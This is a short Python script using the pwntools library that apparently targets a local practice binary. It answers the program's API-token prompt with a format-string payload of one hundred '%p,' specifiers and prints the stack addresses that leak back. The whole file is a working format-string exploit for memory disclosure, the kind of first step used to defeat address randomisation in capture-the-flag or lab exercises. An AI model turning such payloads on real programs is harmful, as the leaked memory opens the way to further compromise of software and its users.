from pwn import *

try:
    sh = process("./a.out")
    sh.sendline("1")
    sh.sendlineafter("What is your API token?", "%p," * 100)
    addresses = sh.recvlines(3)[2].decode("utf-8").split(",")
    for address in addresses:
        print(address)
    sh.close()
except EOFError:
    pass
